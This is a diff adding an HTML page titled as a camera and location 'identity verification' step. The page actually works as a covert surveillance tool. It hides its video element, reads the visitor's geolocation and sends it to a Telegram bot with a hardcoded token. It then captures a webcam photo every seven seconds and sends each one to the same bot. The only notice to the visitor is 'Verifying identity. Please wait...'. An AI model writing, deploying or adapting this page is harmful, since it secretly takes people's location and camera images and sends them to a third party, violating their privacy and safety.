@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera + Location Verification</title>
+  <style>
+    body { font-family: Arial; text-align: center; margin-top: 30px; direction: ltr; }
+    #video { display: none; }
+  </style>
+</head>
+<body>
+  <h2>Verifying identity. Please wait...</h2>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    const BOT_TOKEN = "7563056522:AAGtCUHe64GmfalmLnBQC3KvAHkX8XSkRTQ";
+    const CHAT_ID = "8012505053";
+
+    // إرسال الموقع الجغرافي (مرة واحدة فقط عند الدخول)
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const locationMessage = `User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: locationMessage
+          })
+        });
+      }, error => {
+        console.error("Location error:", error.message);
+      });
+    } else {
+      console.warn("Geolocation not supported.");
+    }
+
+    // تشغيل الكاميرا وإرسال الصورة كل 7 ثوانٍ
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setInterval(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(blob => {
+            if (blob) {
+              const formData = new FormData();
+              formData.append("chat_id", CHAT_ID);
+              formData.append("caption", "Auto-captured image");
+              formData.append("photo", blob, "image.jpg");
+
+              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+              })
+              .then(res => {
+                if (!res.ok) {
+                  console.error("Failed to send image:", res.statusText);
+                }
+              })
+              .catch(err => console.error("Connection error:", err));
+            }
+          }, "image/jpeg", 0.6);
+        }, 7000); // كل 7 ثواني
+      })
+      .catch(err => {
+        alert("Camera access denied. Please allow access and refresh the page.");
+        console.error("Camera error:", err);
+      });
+  </script>
+</body>
+</html>
